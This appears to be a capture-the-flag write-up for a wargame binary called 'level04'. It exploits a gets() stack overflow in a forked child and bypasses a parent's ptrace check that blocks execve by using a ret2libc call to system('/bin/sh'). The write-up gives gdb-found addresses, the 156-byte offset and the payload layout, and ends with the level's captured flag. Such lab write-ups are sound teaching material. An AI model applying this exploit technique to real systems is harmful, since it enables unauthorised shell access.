# Level04 Write-up

## Introduction

The program looks like it creates some child processes:

```bash
└─$ ./level04          
Give me some shellcode, k
a
child is exiting...
```

## Debugging Setup

To follow the child with gdb, I use:

```gdb
(gdb) set follow-fork-mode child
```

## Vulnerability Analysis

Actually, the problem is that the buffer is only 128 bytes in size, and the child uses a `gets` function which is not secure, so it's possible to override the value of the EIP address.

But the problem here is:

```c
do
{
  wait(&stat_loc);
  v6 = stat_loc;
  if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
  {
    puts("child is exiting...");
    return 0;
  }
  v8 = ptrace(PTRACE_PEEKUSER, fork_value, 44, 0);
}
while ( v8 != 11 );
puts("no exec() for you");
kill(fork_value, 9);
```

The parent is using `ptrace` on the child and looks every time if the register `eax` contains 11, which is actually the `execve` syscall.

## Solution

So I need a payload that doesn't use a syscall.

The solution is to call something that doesn't use a syscall to spawn a shell.

I use `system` because it's a libc function and doesn't use a syscall inside.

`system` takes one argument, which is where the program is. Here it wants `/bin/bash` or `/bin/sh`.

## Finding Addresses

```gdb
info function system
0xf7e6aed0  system
```

So this address for EIP.

After that, I need the argument, and the string is `/bin/sh`.

So let's find an address with that:

```gdb
(gdb) info proc mapping
process 6197
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
```

And I found `0xf7f897ec` for `/bin/sh`.

Now I need to know how many bytes before overriding EIP:

```
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $eip
[+] Searching for '6f616162'/'6261616f' with period=4
[+] Found at offset 156 (little-endian search) likely
gef➤  
```

So 156 bytes before.

And because I call a function, I need the stack to look like this:

```
[ESP + 0] -> address of return
[ESP + 4] -> first argument
[ESP + 8] -> second argument
```

## Payload Structure

So the payload needs to look like this:

```
padding 156 + addr of system + return addr + addr "/bin/sh"
```

For the address of return, it's not important, but it's possible to put any address like `exit()`:

```gdb
info function exit
0xf7e5eb70  exit
```

## Flag

```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
